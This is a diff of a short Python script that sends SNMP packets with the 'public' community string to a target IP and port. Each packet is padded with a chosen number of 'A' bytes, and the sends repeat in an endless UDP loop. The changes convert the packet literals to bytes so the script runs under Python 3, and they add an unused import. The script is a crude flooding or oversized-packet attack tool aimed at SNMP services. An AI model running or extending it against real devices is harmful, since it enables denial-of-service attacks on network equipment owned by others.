@@ -1,12 +1,13 @@
 import socket
 import time
 import threading
+import os
 
 def send_snmp_request(target_ip, target_port, packet_size):
-    msg_ver = "\x02\x01\x01"
-    msg_community = "\x04\x06\x70\x75\x62\x6c\x69\x63"
-    msg_pdu = "\xA2"
-    msg_value = "\x02\x04" + "\x00" * 4
+    msg_ver = b"\x02\x01\x01"
+    msg_community = b"\x04\x06\x70\x75\x62\x6c\x69\x63"
+    msg_pdu = b"\xA2"
+    msg_value = b"\x02\x04" + b"\x00" * 4
 
     # create a socket object
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,7 +20,7 @@ def send_snmp_request(target_ip, target_port, packet_size):
         client_socket.connect((target_ip, target_port))
 
         while True:
-            client_socket.send(msg_ver + msg_community + msg_pdu + msg_value + "A" * packet_size)
+            client_socket.send(msg_ver + msg_community + msg_pdu + msg_value + b"A" * packet_size)
 
     except socket.error as e:
         print("Error: Failed to send SNMP request -", e)
